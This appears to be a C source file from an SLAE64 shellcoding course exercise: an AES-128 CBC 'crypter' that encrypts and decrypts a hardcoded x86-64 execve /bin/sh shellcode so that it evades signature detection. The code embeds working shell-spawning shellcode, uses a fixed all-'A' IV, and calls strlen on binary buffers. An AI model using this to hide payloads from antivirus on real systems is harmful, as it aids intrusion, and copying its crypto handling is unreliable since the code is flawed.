/*
 * Compile : gcc aes-shellcode-crypter.c -lmcrypt -o aes-shellcode-crypter
 *
 * Author : SLAE64-PA-6470 (kahlon81)
 * Date : 2018/02/21
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * MCrypt API available online:
 * http://linux.die.net/man/3/mcrypt
 */
#include <mcrypt.h>

#include <math.h>
#include <stdint.h>
#include <stdlib.h>

int encrypt(
    void* buffer,
    int buffer_len, /* Because the plaintext could include null bytes*/
    char* IV,
    char* key,
    int key_len
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}

  mcrypt_generic_init(td, key, key_len, IV);
  mcrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);

  return 0;
}

int decrypt(
    void* buffer,
    int buffer_len,
    char* IV, 
    char* key,
    int key_len 
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}

  mcrypt_generic_init(td, key, key_len, IV);
  mdecrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);

  return 0;
}

void display_hex(char* cipher, int len) {
  int v;
  for (v=0; v<len; v++)
    //printf("\\x%2hhX", cipher[v]);
    printf("\\x%02x", cipher[v] & 0xff);
  printf("\n");
}

int main(int argc, char **argv)
{
  MCRYPT td, td2;
  unsigned char shellcode[] = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
  unsigned char *plaintext = shellcode;
  char* IV = "AAAAAAAAAAAAAAAA";
  char* buffer;
  int buffer_len = strlen(plaintext);

  // check param
  if (argc != 2) {
    printf("Usage : ./aes-shellcode-crypter <128 bits encryption key>\n");
    printf("Example : ./aes-shellcode-crypter 0123456789abcdef\n");
    exit(-1);
  }

  // input key
  char *key = (char *)argv[1];
  int keysize = strlen(key);

  buffer = calloc(1, buffer_len);
  strncpy(buffer, plaintext, buffer_len);

  printf("plain size=%d:\n", strlen(plaintext));
  display_hex(plaintext, strlen(plaintext));

  encrypt(buffer, buffer_len, IV, key, keysize); 

  printf("cipher size=%d:\n", strlen(buffer));
  display_hex(buffer, buffer_len);

  decrypt(buffer, buffer_len, IV, key, keysize);

  printf("decrypt size=%d:\n", strlen(buffer));
  display_hex(buffer, buffer_len);

  return 0;
}